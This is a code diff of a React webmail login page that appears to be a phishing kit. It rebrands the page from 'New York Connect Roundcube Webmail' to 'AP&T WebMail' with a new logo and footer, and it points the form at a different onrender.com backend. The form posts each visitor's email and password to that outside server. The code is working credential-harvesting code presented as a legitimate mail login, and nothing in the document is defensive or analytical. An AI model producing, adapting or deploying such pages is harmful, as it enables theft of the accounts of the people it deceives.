@@ -8,7 +8,7 @@ import axios from 'axios';
 import logo from './logo.png';
 import google from './google.png';
 import rounde from './round.png';
-
+import aptlogo from './apt_logo.png';
 
 
 
@@ -19,7 +19,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("New York Connect")
+    const[platform, setPlatform] = useState("APT")
 
     const[showError, setShowError] = useState(false);
 
@@ -30,7 +30,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
+        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -68,7 +68,7 @@ async function handleSubmit(e){
 
             <div className='col-md-5 whitediv m-auto py-3 px-4'>
                 <div className='text-left'>
-                <img className='logoimage' src={rounde} />
+                <img className='logoimage' src={aptlogo} />
 
                 </div>
 
@@ -105,7 +105,7 @@ async function handleSubmit(e){
             </div>
 
 
-            <p className='info mt-5'>New York Connect Roundcube Webmail  ●  Get support</p>
+            <p className='info mt-5'>AP&T WebMail  ●  Get support</p>
         
         </>
     );
